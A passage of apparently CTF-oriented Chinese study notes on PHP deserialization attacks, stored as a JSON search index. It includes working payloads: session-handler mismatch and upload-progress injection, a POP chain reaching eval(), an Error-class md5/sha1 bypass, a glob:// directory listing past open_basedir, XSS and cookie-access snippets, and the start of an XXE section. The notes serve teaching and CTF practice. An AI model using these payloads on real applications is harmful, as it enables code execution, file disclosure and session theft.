<p>SESSION\u6587\u4ef6\u7684\u5185\u5bb9\u662f<code>names:6:\"spoock\";</code>\u3002\u7531\u4e8e<code>name</code>\u7684\u957f\u5ea6\u662f4\uff0c4\u5728ASCII\u8868\u4e2d\u5bf9\u5e94\u7684\u5c31\u662f<code>EOT</code>\u3002\u6839\u636ephp_binary\u7684\u5b58\u50a8\u89c4\u5219\uff0c\u6700\u540e\u5c31\u662f<code>names:6:\"spoock\";</code>\u3002</p> <p>\u4ee5\u4e0a\u4e3a\u9884\u5907\u77e5\u8bc6</p> <p>PHP\u4e2d\u7684Session\u7684\u5b9e\u73b0\u662f\u6ca1\u6709\u7684\u95ee\u9898\uff0c\u5371\u5bb3\u4e3b\u8981\u662f\u7531\u4e8e\u7a0b\u5e8f\u5458\u7684Session\u4f7f\u7528\u4e0d\u5f53\u800c\u5f15\u8d77\u7684\u3002</p> <p>\u5982\u679c\u5728PHP\u5728\u53cd\u5e8f\u5217\u5316\u5b58\u50a8\u7684$_SESSION\u6570\u636e\u65f6\u4f7f\u7528\u7684\u5f15\u64ce\u548c\u5e8f\u5217\u5316\u4f7f\u7528\u7684\u5f15\u64ce\u4e0d\u4e00\u6837\uff0c\u4f1a\u5bfc\u81f4\u6570\u636e\u65e0\u6cd5\u6b63\u786e\u7684\u53cd\u5e8f\u5217\u5316\u3002\u901a\u8fc7\u7cbe\u5fc3\u6784\u9020\u7684\u6570\u636e\u5305\uff0c\u5c31\u53ef\u4ee5\u7ed5\u8fc7\u7a0b\u5e8f\u7684\u9a8c\u8bc1\u6216\u8005\u662f\u6267\u884c\u4e00\u4e9b\u7cfb\u7edf\u7684\u65b9\u6cd5\u3002</p> <pre><code>$_SESSION['ryat'] = '|O:11:\"PeopleClass\":0:{}';\n</code></pre> <p>\u4e0a\u8ff0\u7684$_SESSION\u7684\u6570\u636e\u4f7f\u7528<code>php_serialize</code>\uff0c\u90a3\u4e48\u6700\u540e\u7684\u5b58\u50a8\u7684\u5185\u5bb9\u5c31\u662f<code>a:1:{s:6:\"spoock\";s:24:\"|O:11:\"PeopleClass\":0:{}\";}</code>\u3002</p> <p>\u4f46\u662f\u670d\u52a1\u5668\u5728\u8fdb\u884c\u8bfb\u53d6\u7684\u65f6\u5019\uff0c\u9ed8\u8ba4\u9009\u62e9\u7684\u662f<code>php</code>\uff0c\u90a3\u4e48\u6700\u540e\u8bfb\u53d6\u7684\u5185\u5bb9\u662f:</p> <pre><code>array (size=1)\n  'a:1:{s:6:\"spoock\";s:24:\"' =&gt; \n    object(__PHP_Incomplete_Class)[1]\n      public '__PHP_Incomplete_Class_Name' =&gt; string 'PeopleClass' (length=11)\n</code></pre> <p>\u8fd9\u662f\u56e0\u4e3a\u5f53\u4f7f\u7528php\u5f15\u64ce\u7684\u65f6\u5019\uff0cphp\u5f15\u64ce\u4f1a\u4ee5|\u4f5c\u4e3a\u4f5c\u4e3akey\u548cvalue\u7684\u5206\u9694\u7b26\uff0c\u90a3\u4e48\u5c31\u4f1a\u5c06<code>a:1:{s:6:\"spoock\";s:24:\"</code>\u4f5c\u4e3aSESSION\u7684key\uff0c\u5c06<code>O:11:\"PeopleClass\":0:{}</code>\u4f5c\u4e3avalue\uff0c\u7136\u540e\u8fdb\u884c\u53cd\u5e8f\u5217\u5316\uff0c\u6700\u540e\u5c31\u4f1a\u5f97\u5230PeopleClas\u8fd9\u4e2a\u7c7b\u3002\u8fd9\u79cd\u7531\u4e8e\u5e8f\u5217\u8bdd\u5316\u548c\u53cd\u5e8f\u5217\u5316\u6240\u4f7f\u7528\u7684\u4e0d\u4e00\u6837\u7684\u5f15\u64ce\u5c31\u662f\u9020\u6210PHP Session\u5e8f\u5217\u8bdd\u6f0f\u6d1e\u7684\u539f\u56e0\u3002</p> <p>\u4e0b\u9762\u7684\u6458\u81ea\u67d0\u4e2a\u535a\u5ba2\uff1a</p>"},{"location":"web_bak/serialize/PHP/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%B7%B3%E6%9D%BF/#session_start","title":"session_start()","text":"<p>\u9996\u5148\u8bbf\u95ee1.php\uff0c\u5728\u4f20\u5165\u7684\u53c2\u6570\u6700\u5f00\u59cb\u52a0\u4e00\u4e2a'|'\uff0c\u7531\u4e8e1.php\u662f\u4f7f\u7528php_serialize\u5f15\u64ce\u5904\u7406\uff0c\u56e0\u6b64\u53ea\u4f1a\u628a'|'\u5f53\u505a\u4e00\u4e2a\u6b63\u5e38\u7684\u5b57\u7b26\u3002\u7136\u540e\u8bbf\u95ee2.php\uff0c\u7531\u4e8e\u7528\u7684\u662fphp\u5f15\u64ce\uff0c\u56e0\u6b64\u9047\u5230'|'\u65f6\u4f1a\u5c06\u4e4b\u770b\u505a\u952e\u540d\u4e0e\u503c\u7684\u5206\u5272\u7b26\uff0c\u4ece\u800c\u9020\u6210\u4e86\u6b67\u4e49\uff0c\u5bfc\u81f4\u5176\u5728\u89e3\u6790session\u6587\u4ef6\u65f6\u76f4\u63a5\u5bf9'|'\u540e\u7684\u503c\u8fdb\u884c\u53cd\u5e8f\u5217\u5316\u5904\u7406\u3002</p> <p>\u8fd9\u91cc\u53ef\u80fd\u4f1a\u6709\u4e00\u4e2a\u5c0f\u7591\u95ee\uff0c\u4e3a\u4ec0\u4e48\u5728\u89e3\u6790session\u6587\u4ef6\u65f6\u76f4\u63a5\u5bf9'|'\u540e\u7684\u503c\u8fdb\u884c\u53cd\u5e8f\u5217\u5316\u5904\u7406\uff0c\u8fd9\u4e5f\u662f\u5904\u7406\u5668\u7684\u529f\u80fd\uff1f\u8fd9\u4e2a\u5176\u5b9e\u662f\u56e0\u4e3asession_start()\u8fd9\u4e2a\u51fd\u6570\uff0c\u53ef\u4ee5\u770b\u4e0b\u5b98\u65b9\u8bf4\u660e\uff1a</p> <p></p> <pre><code>&lt;?php   class student{      var $name;      var $age;   }   $a = new student(); $a-&gt;nage =  \"hacker\";   $a-&gt;age = \"1111\";   echo serialize($a);\n</code></pre> <p></p> <p>\u653b\u51fb\u601d\u8def\u4e2d\u8bf4\u5230\u4e86\u56e0\u4e3a\u4e0d\u540c\u7684\u5f15\u64ce\u4f1a\u5bf9<code>'|'</code>\uff0c\u4ea7\u751f\u6b67\u4e49\uff0c\u6240\u4ee5\u5728\u4f20\u53c2\u65f6\u5728payload\u524d\u52a0\u4e2a<code>'|'</code>\uff0c\u4f5c\u4e3aa\u53c2\u6570\uff0c\u8bbf\u95ee<code>1.php</code>,\u67e5\u770b\u4e00\u4e0b\u672c\u5730session\u6587\u4ef6\uff0c\u53d1\u73b0payload\u5df2\u7ecf\u5b58\u5165\u5230<code>session</code>\u6587\u4ef6</p> <p></p> <p><code>php_serialize</code>\u5f15\u64ce\u4f20\u5165\u7684payload\u4f5c\u4e3alemon\u5bf9\u5e94\u503c\uff0c\u800c<code>php</code>\u5219\u5b8c\u5168\u4e0d\u4e00\u6837\uff1a</p> <p></p> <p>\u8bbf\u95ee\u4e00\u4e0b2.php</p> <p></p> <p>OVER</p>"},{"location":"web_bak/serialize/PHP/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%B7%B3%E6%9D%BF/#session_upload_process","title":"session_upload_process","text":"<p>\u5728<code>PHP</code>\u4e2d\u8fd8\u5b58\u5728\u4e00\u4e2a<code>upload_process</code>\u673a\u5236\uff0c\u5373\u81ea\u52a8\u5728<code>$_SESSION</code>\u4e2d\u521b\u5efa\u4e00\u4e2a\u952e\u503c\u5bf9\uff0c\u503c\u4e2d\u521a\u597d\u5b58\u5728\u7528\u6237\u53ef\u63a7\u7684\u90e8\u5206\uff0c\u53ef\u4ee5\u770b\u4e0b\u5b98\u65b9\u63cf\u8ff0\u7684\uff0c\u8fd9\u4e2a\u529f\u80fd\u5728\u6587\u4ef6\u4e0a\u4f20\u7684\u8fc7\u7a0b\u4e2d\u5229\u7528<code>session</code>\u5b9e\u65f6\u8fd4\u56de\u4e0a\u4f20\u7684\u8fdb\u5ea6\u3002</p> <p></p> <p>\u8fd9\u91cc\u9700\u8981\u5148\u4e0a\u4f20\u6587\u4ef6\uff0c\u540c\u65f6POST\u4e00\u4e2a\u4e0esession.upload_process.name\u7684\u540c\u540d\u53d8\u91cf\u3002\u540e\u7aef\u4f1a\u81ea\u52a8\u5c06POST\u7684\u8fd9\u4e2a\u540c\u540d\u53d8\u91cf\u4f5c\u4e3a\u952e\u8fdb\u884c\u5e8f\u5217\u5316\u7136\u540e\u5b58\u50a8\u5230session\u6587\u4ef6\u4e2d\u3002\u4e0b\u6b21\u8bf7\u6c42\u5c31\u4f1a\u53cd\u5e8f\u5217\u5316session\u6587\u4ef6\uff0c\u4ece\u4e2d\u53d6\u51fa\u8fd9\u4e2a\u952e\u3002\u6240\u4ee5\u653b\u51fb\u70b9\u8fd8\u662f\u8ddf\u4e0a\u4e00\u90e8\u5206\u4e00\u6a21\u4e00\u6837\uff0c\u7a0b\u5e8f\u8fd8\u662f\u4f7f\u7528\u4e86\u4e0d\u540c\u7684session\u5904\u7406\u5f15\u64ce\u3002</p> <p>\u901a\u8fc7<code>POST</code>\u65b9\u6cd5\u6765\u6784\u9020\u6570\u636e\u4f20\u5165<code>$_SESSION</code></p> <pre><code>&lt;form action=\"http://web.jarvisoj.com:32784/index.php\" method=\"POST\" enctype=\"multipart/form-data\"&gt;\n    &lt;input type=\"hidden\" name=\"PHP_SESSION_UPLOAD_PROGRESS\" value=\"123\" /&gt;\n    &lt;input type=\"file\" name=\"file\" /&gt;\n    &lt;input type=\"submit\" /&gt;\n&lt;/form&gt;//\u5176\u5b9e\u8fd9\u91cc\u7684\u610f\u601d\u662f\uff0c\u6211\u4eec\u81ea\u5df1\u5199\u4e00\u4e2a\u7b80\u5355\u7684\u7f51\u9875\uff0c\u7136\u540e\u5411web\u7aef\u63d0\u4ea4\u6570\u636e\uff0c\u8fd9\u4e2a\u63d0\u4ea4\u540c\u65f6\u5305\u542b\u4e86post\u548cupload\u3002\u7136\u540e\u6211\u4eec\u63d0\u4ea4\u53cd\u5e8f\u5217\u5316\u7684\u6570\u636e\uff0c\u7531\u4e8euplaod_process\u4f1a\u81ea\u52a8\u6dfb\u52a0\u6570\u636e\u5230$_session\u4e2d\uff0c\u800c$_session\u4e2d\u7684\u6570\u636e\u53c8\u4f1a\u81ea\u5df1\u53cd\u5e8f\u5217\u5316\uff08\u7528php\u7684\u65b9\u6cd5\uff09\u6784\u6790\u540e\u5c31\u76f8\u5f53\u4e8eunserilize\u51fd\u6570\u4e86\u3002\n</code></pre> <p>\u8fd9\u4e2asession\u770b\u4e0d\u61c2\u7684\u8bdd\u5efa\u8bae\u81ea\u5df1\u591a\u591a\u627e\u8d44\u6599\u4e86\u89e3\u4e00\u4e0b\uff0c\u56e0\u4e3a\u786e\u5b9e\u6709\u70b9\u96be\u3002</p>"},{"location":"web_bak/serialize/PHP/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%B7%B3%E6%9D%BF/#_1","title":"\u4e3e\u4f8b\uff08\u4f8b\u9898\uff09","text":"<pre><code>&lt;?php\nhighlight_string(file_get_contents(basename($_SERVER['PHP_SELF'])));\n//show_source(__FILE__);\nclass foo1{\npublic $varr;\nfunction __construct(){\n$this-&gt;varr = \"index.php\";\n}\nfunction __destruct(){\nif(file_exists($this-&gt;varr)){\necho \"&lt;br&gt;\u6587\u4ef6\".$this-&gt;varr.\"\u5b58\u5728&lt;br&gt;\";\n}\necho \"&lt;br&gt;\u8fd9\u662ffoo1\u7684\u6790\u6784\u51fd\u6570&lt;br&gt;\";\n}\n}\nclass foo2{\npublic $varr;\npublic $obj;\nfunction __construct(){\n$this-&gt;varr = '1234567890';\n$this-&gt;obj = null;\n}\nfunction __toString(){\n$this-&gt;obj-&gt;execute();\nreturn $this-&gt;varr;\n}\nfunction __desctuct(){\necho \"&lt;br&gt;\u8fd9\u662ffoo2\u7684\u6790\u6784\u51fd\u6570&lt;br&gt;\";\n}\n}\nclass foo3{\npublic $varr;\nfunction execute(){\neval($this-&gt;varr);\n}\nfunction __desctuct(){\necho \"&lt;br&gt;\u8fd9\u662ffoo3\u7684\u6790\u6784\u51fd\u6570&lt;br&gt;\";\n}\n}\n?&gt;\n</code></pre> <p>index.php</p> <pre><code>&lt;?php\nini_set('session.serialize_handler', 'php');\nrequire(\"./class.php\");\nsession_start();\n$obj = new foo1();\n$obj-&gt;varr = \"phpinfo.php\";\n?&gt;\n</code></pre> <p>\u901a\u8fc7\u4ee3\u7801\u53d1\u73b0\uff0c\u6211\u4eec\u6700\u7ec8\u662f\u8981\u901a\u8fc7foo3\u4e2d\u7684execute\u6765\u6267\u884c\u6211\u4eec\u81ea\u5b9a\u4e49\u7684\u51fd\u6570\u3002</p> <p>\u6784\u9020\uff1a</p> <pre><code>&lt;?php\nclass foo3{\n        public $varr='echo \"spoock\";';\n        function execute(){\n                eval($this-&gt;varr);\n        }\n}\nclass foo2{\n        public $varr;\n        public $obj;\n        function __construct(){\n                $this-&gt;varr = '1234567890';\n                $this-&gt;obj = new foo3();\n        }\n        function __toString(){\n                $this-&gt;obj-&gt;execute();\n                return $this-&gt;varr;\n        }\n}\n\nclass foo1{\n        public $varr;\n        function __construct(){\n                $this-&gt;varr = new foo2();\n        }\n}\n\n\n$obj = new foo1();\nprint_r(serialize($obj));\n?&gt;\n</code></pre> <p>\u5199\u5165\u7684\u65b9\u5f0f\u4e3b\u8981\u662f\u5229\u7528PHP\u4e2dSession Upload Progress\u6765\u8fdb\u884c\u8bbe\u7f6e\uff0c\u5177\u4f53\u4e3a\uff0c\u5728\u4e0a\u4f20\u6587\u4ef6\u65f6\uff0c\u5982\u679cPOST\u4e00\u4e2a\u540d\u4e3aPHP_SESSION_UPLOAD_PROGRESS\u7684\u53d8\u91cf\uff0c\u5c31\u53ef\u4ee5\u5c06filename\u7684\u503c\u8d4b\u503c\u5230session\u4e2d</p>"},{"location":"web_bak/serialize/PHP/PHP%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%BA%94%E7%94%A8/DirectoryIterator/","title":"DirectoryIterator","text":"<p>\u63d0\u4f9b\u4e86\u4e00\u4e2a\u7528\u4e8e\u67e5\u770b\u6587\u4ef6\u7cfb\u7edf\u76ee\u5f55\u5185\u5bb9\u7684\u7b80\u5355\u63a5\u53e3\uff0c\u8be5\u7c7b\u662f\u5728 PHP 5 \u4e2d\u589e\u52a0\u7684\u4e00\u4e2a\u7c7b\u3002</p> <p>DirectoryIterator\u4e0eglob://\u534f\u8bae\u7ed3\u5408\u5c06\u65e0\u89c6open_basedir\u5bf9\u76ee\u5f55\u7684\u9650\u5236\uff0c\u53ef\u4ee5\u7528\u6765\u5217\u4e3e\u51fa\u6307\u5b9a\u76ee\u5f55\u4e0b\u7684\u6587\u4ef6\u3002</p> <pre><code>test.php&lt;?php$dir\u00a0=\u00a0$_GET['whoami'];$a\u00a0=\u00a0new\u00a0DirectoryIterator($dir);foreach($a\u00a0as\u00a0$f)    {\u00a0\u00a0\u00a0\u00a0 echo($f-&gt;__toString().'&lt;br&gt;');}?&gt;\u00a0\u00a0\u00a0\u00a0#\u00a0payload\u4e00\u53e5\u8bdd\u7684\u5f62\u5f0f:$a\u00a0=\u00a0new\u00a0DirectoryIterator(\"glob:///*\");foreach($a\u00a0as\u00a0$f){echo($f-&gt;__toString().'&lt;br&gt;');}?&gt;\n</code></pre> <p>\u6211\u4eec\u8f93\u5165<code>/?whoami=glob:///*</code>\u5373\u53ef\u5217\u51fa\u6839\u76ee\u5f55\u4e0b\u7684\u6587\u4ef6\uff1a\u4f46\u662f\u4f1a\u53d1\u73b0\u53ea\u80fd\u5217\u6839\u76ee\u5f55\u548copen_basedir\u6307\u5b9a\u7684\u76ee\u5f55\u7684\u6587\u4ef6\uff0c\u4e0d\u80fd\u5217\u51fa\u9664\u524d\u9762\u7684\u76ee\u5f55\u4ee5\u5916\u7684\u76ee\u5f55\u4e2d\u7684\u6587\u4ef6\uff0c\u4e14\u4e0d\u80fd\u8bfb\u53d6\u6587\u4ef6\u5185\u5bb9\u3002</p> <p>\u4f46\u662f\u7ecf\u8fc7\u79ef\u7d2f\uff0c\u8fd8\u662f\u6709\u7c7b\u80fd\u591f\u8bfb\u5230\u6587\u4ef6\uff08\u89c1\u5176\u4ed6\uff09</p>"},{"location":"web_bak/serialize/PHP/PHP%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%BA%94%E7%94%A8/Error_Exception/","title":"ERROR\u7c7b\u548cexception\u7c7b","text":"<p>\u987e\u540d\u601d\u4e49\uff0cerror\u7c7b\u662fphp\u4e2d\u7684\u62a5\u9519\u7c7b</p> <p>exception\u4e3aphp\u4e2d\u7684\u5f02\u5e38\u7c7b\u3002</p> <p>\u56e0\u4e3a\u5b83\u5185\u7f6e\u6709\u4e00\u4e2a<code>__toString()</code>\u7684\u65b9\u6cd5\uff0c\u5e38\u7528\u4e8ePHP \u53cd\u5e8f\u5217\u5316\u4e2d\u3002</p> <p>\u63a5\u4e0b\u6765\u4ecb\u7ecd\u7528\u6cd5\uff08\u6b22\u8fce\u8865\u5145\u59ff\u52bf\uff09</p>"},{"location":"web_bak/serialize/PHP/PHP%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%BA%94%E7%94%A8/Error_Exception/#1-md5sha1","title":"1 .md5()\u548csha1()\u7ed5\u8fc7","text":"<p>md5\u51fd\u6570\u7684\u7ed5\u8fc7\u5e94\u8be5\u5927\u5bb6\u90fd\u6e05\u695a\uff0c\u6700\u5e38\u7528\u7684\u65b9\u6cd5\u662fnull==null\u3002</p> <p>\u4e5f\u5c31\u662f\u4f20\u53c2\u7684\u65f6\u5019\u53d8\u4e3a\u6570\u7ec4\uff0c\u7136\u540e\u4f7fphp\u89e3\u6790\u62a5\u9519</p> <p>\u90a3\u4e48\u8fd9\u91cc\u5176\u5b9e\u539f\u7406\u5f88\u4e3a\u7c7b\u4f3c</p> <p><code>Error</code> \u662f\u6240\u6709PHP\u5185\u90e8\u9519\u8bef\u7c7b\u7684\u57fa\u7c7b\uff0c\u8be5\u7c7b\u662f\u5728PHP 7.0.0 \u4e2d\u5f00\u59cb\u5f15\u5165\u7684\u3002</p> <ul> <li> <p><code>Error::__construct</code>\u2014 \u521d\u59cb\u5316 error \u5bf9\u8c61</p> </li> <li> <p><code>Error::getMessage</code>\u2014 \u83b7\u53d6\u9519\u8bef\u4fe1\u606f</p> </li> <li> <p><code>Error::getPrevious</code>\u2014 \u8fd4\u56de\u5148\u524d\u7684 Throwable</p> </li> <li> <p><code>Error::getCode</code>\u2014 \u83b7\u53d6\u9519\u8bef\u4ee3\u7801</p> </li> <li> <p><code>Error::getFile</code>\u2014 \u83b7\u53d6\u9519\u8bef\u53d1\u751f\u65f6\u7684\u6587\u4ef6</p> </li> <li> <p><code>Error::getLine</code>\u2014 \u83b7\u53d6\u9519\u8bef\u53d1\u751f\u65f6\u7684\u884c\u53f7</p> </li> <li> <p><code>Error::getTrace</code>\u2014 \u83b7\u53d6\u8c03\u7528\u6808\uff08stack trace\uff09</p> </li> <li> <p><code>Error::getTraceAsString</code>\u2014 \u83b7\u53d6\u5b57\u7b26\u4e32\u5f62\u5f0f\u7684\u8c03\u7528\u6808\uff08stack trace\uff09</p> </li> <li> <p><code>Error::__toString</code>\u2014 error \u7684\u5b57\u7b26\u4e32\u8868\u8fbe</p> </li> <li> <p><code>Error::__clone</code>\u2014 \u514b\u9686 error</p> </li> </ul> <p><code>Exception</code> \u662f\u6240\u6709\u5f02\u5e38\u7684\u57fa\u7c7b\uff0c\u8be5\u7c7b\u662f\u5728PHP 5.0.0 \u4e2d\u5f00\u59cb\u5f15\u5165\u7684\u3002</p> <ul> <li> <p><code>Exception::__construct</code>\u2014 \u5f02\u5e38\u6784\u9020\u51fd\u6570</p> </li> <li> <p><code>Exception::getMessage</code>\u2014 \u83b7\u53d6\u5f02\u5e38\u6d88\u606f\u5185\u5bb9</p> </li> <li> <p><code>Exception::getPrevious</code>\u2014 \u8fd4\u56de\u5f02\u5e38\u94fe\u4e2d\u7684\u524d\u4e00\u4e2a\u5f02\u5e38</p> </li> <li> <p><code>Exception::getCode</code>\u2014 \u83b7\u53d6\u5f02\u5e38\u4ee3\u7801</p> </li> <li> <p><code>Exception::getFile</code>\u2014 \u521b\u5efa\u5f02\u5e38\u65f6\u7684\u7a0b\u5e8f\u6587\u4ef6\u540d\u79f0</p> </li> <li> <p><code>Exception::getLine</code>\u2014 \u83b7\u53d6\u521b\u5efa\u7684\u5f02\u5e38\u6240\u5728\u6587\u4ef6\u4e2d\u7684\u884c\u53f7</p> </li> <li> <p><code>Exception::getTrace</code>\u2014 \u83b7\u53d6\u5f02\u5e38\u8ffd\u8e2a\u4fe1\u606f</p> </li> <li> <p><code>Exception::getTraceAsString</code>\u2014 \u83b7\u53d6\u5b57\u7b26\u4e32\u7c7b\u578b\u7684\u5f02\u5e38\u8ffd\u8e2a\u4fe1\u606f</p> </li> <li> <p><code>Exception::__toString</code>\u2014 \u5c06\u5f02\u5e38\u5bf9\u8c61\u8f6c\u6362\u4e3a\u5b57\u7b26\u4e32</p> </li> <li> <p><code>Exception::__clone</code>\u2014 \u5f02\u5e38\u514b\u9686</p> </li> </ul> <p>\u4e24\u4e2a\u51fd\u6570\u5747\u6709__tostring\u7c7b</p> <p>\u7a0d\u5fae\u89e3\u91ca\u4e0b\uff1a\uff08\u6697\u793a\u4f8b\u5b50\uff09</p> <pre><code>&lt;?php\nerror_reporting(0);\nclass SYCLOVER \n{        \n    public $syc;    \n    public $lover;       \n    public function __wakeup()      \n    {       \n        if( \n            ($this-&gt;syc != $this-&gt;lover) \n            &amp;&amp; (md5($this-&gt;syc) === md5($this-&gt;lover)) \n            &amp;&amp; (sha1($this-&gt;syc)=== sha1($this-&gt;lover)) \n        )      \n        {                          \n            if(!preg_match(\"/\\&lt;\\?php|\\(|\\)|\\\"|\\'/\", $this-&gt;syc, $match))           \n            {\n                eval($this-&gt;syc);\n            }\n            else \n            {               \n                die(\"Try Hard !!\");           \n            }                   \n        }    \n    }\n}\nif (isset($_GET['great'])) \n{    \n    unserialize($_GET['great']);\n} \nelse \n{    \n    highlight_file(__FILE__);\n}\n?&gt;\n</code></pre> <p>(\u770b\u5230\u8fd9\u4e2asyclover\u5c31\u60f3\u5230\u90a3\u5f20\u5927\u8138\u3002\u3002\u3002\uff09</p> <p>\u6bd4\u8f83\u5178\u578b\u7684\u53cd\u5e8f\u5217\u5316\u3002</p> <p>\u60f3\u8981\u8fbe\u6210\u4ee3\u7801\u6267\u884c\u5fc5\u987b\u5148\u901a\u8fc7\u4e0a\u9762\u7684md5\u548csha1\u7684\u6bd4\u8f83\u5339\u914d\u3002</p> <p>\u7531\u4e8e\u662f\u56e0\u4e3a\u5728\u7c7b\u4e2d\uff0c\u6570\u7ec4\u662f\u7528\u4e0d\u4e86\u7684\u3002</p> <p>\u60f3\u60f3__tostring\u7684\u8c03\u7528\u65b9\u6cd5\uff1a</p> <p>\u5f53\u7c7b\u88ab\u5f53\u6210\u5b57\u7b26\u4e32\u65f6\u8c03\u7528</p> <p>\u4e8e\u662f\u6211\u4eec\u6784\u9020\u4e00\u6761\u94fe</p> <p>unserilize-&gt;__wakeup()-&gt;error()\u7c7b-&gt;__tostring-&gt;eval()\u51fd\u6570</p> <pre><code>&lt;?php\nclass\u00a0SYCLOVER\u00a0\n{\u00a0\n    public\u00a0$syc;\u00a0\n    public\u00a0$lover;\u00a0$str\u00a0=\u00a0\"?&gt;&lt;?=include~\".urldecode(\"%D0%99%93%9E%98\").\"?&gt;\";\n} \n$a=new\u00a0Error($str,1); \n$b=new\u00a0Error($str,2);//\u539f\u751f\u7c7b\u7528\u5728\u8fd9\u91cc \n$c\u00a0=\u00a0new\u00a0SYCLOVER(); \n$c-&gt;syc\u00a0=\u00a0$a; \n$c-&gt;lover\u00a0=\u00a0$b;\necho(urlencode(serialize($c)));\n?&gt;\n</code></pre> <p>\u8fd9\u5c31\u662f\u6700\u540e\u7684payload</p> <p>\u8fd9\u91cc\u5e94\u8be5\u662f\u80fd\u770b\u61c2</p> <p>ps:<code>?&gt;</code>\u662f\u56e0\u4e3aERROR\u62a5\u9519\u7c7b\u4f1a\u8df3\u51fa\u4e00\u957f\u4e32\u4e0d\u53ef\u9884\u77e5\u7684\u62a5\u9519\u4fe1\u606f\uff0c\u9700\u8981\u547d\u4ee4\u6267\u884c\u7684\u8bdd\u9700\u8981\u7528<code>?&gt;</code>\u53bb\u95ed\u5408\u6389\u7206\u51fa\u6765\u7684\u6742\u4e03\u6742\u516b\u7684\u4fe1\u606f\u3002<code>~</code>\u662f\u53d6\u53cd\u7b26\u53f7\u7ed5\u8fc7\u8fc7\u6ee4\u3002\uff08\u7406\u89e3\u4e00\u4e0b\uff0c\u548c\u5f02\u6216\u5f88\u7c7b\u4f3c\uff09\u3002</p> <p><code>eval(\"...Error: ?&gt;&lt;?php payload ?&gt;\")</code></p>"},{"location":"web_bak/serialize/PHP/PHP%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%BA%94%E7%94%A8/Error_Exception/#2php70xss","title":"2.PHP7.0\u4e0b\u7684XSS","text":"<pre><code>&lt;?php\n$a\u00a0=\u00a0unserialize($_GET['whoami']);\necho\u00a0$a;\n?&gt;\n</code></pre> <p>\u4e0a\u9762\u7684\u4ee3\u7801\u53ea\u6709\u4e00\u4e2a\u7b80\u5355\u7684\u53cd\u5e8f\u5217\u5316\uff0c\u5e76\u6ca1\u6709\u7ed9\u51fa\u7c7b\uff0c\u8fd9\u65f6\u5019\u4e00\u822c\u90fd\u4f1a\u53bb\u601d\u8003\u4e00\u4e0b\u539f\u751f\u7c7b\u3002</p> <pre><code>&lt;?php\n$a\u00a0=\u00a0new\u00a0Error(\"&lt;script&gt;alert('xss')&lt;/script&gt;\");\n$b\u00a0=\u00a0serialize($a);\necho\u00a0urlencode($b);\u00a0\u00a0\n?&gt;\n</code></pre> <p>\u7136\u540e\u62a5\u9519\u628a\u63d2\u5165\u7684XSS\u4ee3\u7801\u6267\u884c\u3002</p> <p>\u4e4b\u540e\u4e00\u822c\u4f1a\u7528\u5230XSS\u91cc\u9762\u7684\u77e5\u8bc6\u6a21\u5757\u4f8b\u5982\uff1a</p> <p><code>&lt;script&gt;alert(\"\u5185\u5bb9\")&lt;/script&gt;</code>    \u4f7f\u7528<code>&lt;script&gt;</code>\u6807\u7b7e\uff0c\u5f39\u51fa\u6d88\u606f\u5bf9\u8bdd\u6846</p> <p><code>&lt;body onload=alert(\"\u5185\u5bb9\")&gt;</code>   \u4f7f\u7528<code>&lt;body&gt;</code>\u6807\u7b7e\uff0c\u5f39\u51fa\u6d88\u606f\u5bf9\u8bdd\u6846</p> <p><code>&lt;a href=\u201c\u201donclick=alert(\u201c\u5185\u5bb9\u201d)&gt;\u94fe\u63a5\u6587\u5b57&lt;/a&gt;</code> \u4f7f\u7528<code>&lt;a&gt;</code>\u6807\u7b7e\uff0c\u663e\u793a\u53ef\u70b9\u51fb\u94fe\u63a5\uff0c\u70b9\u51fb\u94fe\u63a5\u540e\u5f39\u51fa\u6d88\u606f\u5bf9\u8bdd\u6846</p> <p><code>&lt;imgsrc=WrongIP onerror=alert(\"\u5185\u5bb9\")&gt;</code>   \u4f7f\u7528<code>&lt;img&gt;</code>\u6807\u7b7e\uff0c\u5f39\u51fa\u6d88\u606f\u5bf9\u8bdd\u6846</p> <p><code>&lt;script&gt;window.location.href=\"\u7f51\u7ad9\u5730\u5740\"&lt;/script&gt;</code>  \u4f7f\u7528<code>&lt;script&gt;</code>\u6807\u7b7e\uff0c\u91cd\u5b9a\u5411\u9875\u9762</p> <p><code>&lt;script&gt;alert=(document.cookie)&lt;/script&gt;</code>   \u4f7f\u7528<code>&lt;script&gt;</code>\u6807\u7b7e\uff0ccookie\u83b7\u53d6</p> <p>\u7b49\u7b49</p> <p>\u4f8b\u9898\u53ef\u4ee5\u770b\u8fd9\u4e2a\uff1a\uff08\u7f51\u4e0a\u86ee\u591a\u7684\u6211\u5c31\u4e0d\u653e\u4e86\uff09</p>"},{"location":"web_bak/serialize/PHP/PHP%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%BA%94%E7%94%A8/SimpleXMLElement/","title":"SimpleXMLElement","text":"<p>\u8fd9\u4e2a\u5185\u7f6e\u7c7b\u7528\u4e8e\u89e3\u6790 XML \u6587\u6863\u4e2d\u7684\u5143\u7d20</p> <p></p> <p></p> <p>\u53ef\u4ee5\u770b\u5230\u901a\u8fc7\u8bbe\u7f6e\u7b2c\u4e09\u4e2a\u53c2\u6570 data_is_url \u4e3a<code>true</code>\uff0c\u6211\u4eec\u53ef\u4ee5\u5b9e\u73b0\u8fdc\u7a0bxml\u6587\u4ef6\u7684\u8f7d\u5165\u3002\u7b2c\u4e8c\u4e2a\u53c2\u6570\u7684\u5e38\u91cf\u503c\u6211\u4eec\u8bbe\u7f6e\u4e3a<code>2</code>\u5373\u53ef\u3002\u7b2c\u4e00\u4e2a\u53c2\u6570 data \u5c31\u662f\u6211\u4eec\u81ea\u5df1\u8bbe\u7f6e\u7684payload\u7684url\u5730\u5740\uff0c\u5373\u7528\u4e8e\u5f15\u5165\u7684\u5916\u90e8\u5b9e\u4f53\u7684url\u3002</p> <p>\u8fd9\u6837\u7684\u8bdd\uff0c\u5f53\u6211\u4eec\u53ef\u4ee5\u63a7\u5236\u76ee\u6807\u8c03\u7528\u7684\u7c7b\u7684\u65f6\u5019\uff0c\u4fbf\u53ef\u4ee5\u901a\u8fc7 SimpleXMLElement \u8fd9\u4e2a\u5185\u7f6e\u7c7b\u6765\u6784\u9020 